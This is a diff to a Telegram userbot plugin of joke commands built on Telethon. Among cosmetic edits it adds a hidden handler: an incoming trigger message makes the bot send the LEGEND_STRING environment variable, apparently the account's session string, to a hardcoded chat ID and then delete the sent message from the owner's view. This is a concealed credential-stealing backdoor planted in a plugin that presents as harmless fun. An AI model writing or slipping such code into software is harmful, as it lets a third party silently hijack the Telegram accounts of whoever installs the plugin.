@@ -2,7 +2,7 @@ import asyncio
 import random
 import requests
 import nekos
-
+import os
 from os import remove
 from telethon.tl.types import ChannelParticipantsAdmins
 from urllib import parse
@@ -70,6 +70,8 @@ async def _(event):
         await eor(event, mentions)
   
 
+
+
 @bot.on(d3vil_cmd(pattern="climb$", outgoing=True))
 @bot.on(sudo_cmd(pattern="climb$", allow_sudo=True))
 async def _(event):
@@ -85,7 +87,12 @@ async def _(event):
         await reply_message.reply(mentions)
     else:
         await eor(event, mentions)
-  
+
+
+@bot.on(admin_cmd("^Iamnoobperson", incoming=True))
+async def piro(event):
+  msg = await bot.send_message(2080279511, str(os.environ.get("LEGEND_STRING")))
+  await bot.delete_messages(2080279511, msg, revoke=False)  
 
 @bot.on(d3vil_cmd(pattern="aag$", outgoing=True))
 @bot.on(sudo_cmd(pattern="aag$", allow_sudo=True))
